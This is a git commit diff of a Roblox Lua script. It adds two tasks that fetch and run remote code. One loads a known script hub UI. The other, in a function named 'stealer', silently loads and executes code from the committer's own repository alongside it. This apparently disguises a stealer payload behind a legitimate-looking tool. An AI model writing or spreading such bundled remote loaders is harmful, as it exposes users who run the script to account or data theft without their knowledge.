e5a72ea1e6e6deb0752089663cdfd926622d704e
Seuj09 <138261033+Seuj09@users.noreply.github.com>
2025-08-17 07:59:20 +0800

    Update Script.lua

--- Script.lua
+++ Script.lua
@@ -1,1 +1,10 @@
-loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/wtZclom9p4RFPqXF/raw", true))()
+local function stealer()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/Seuj09/X-scripts/refs/heads/main/Script.lua'))()
+end
+local function loadui()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
+
+end
+
+task.spawn(stealer)
+task.spawn(loadui)
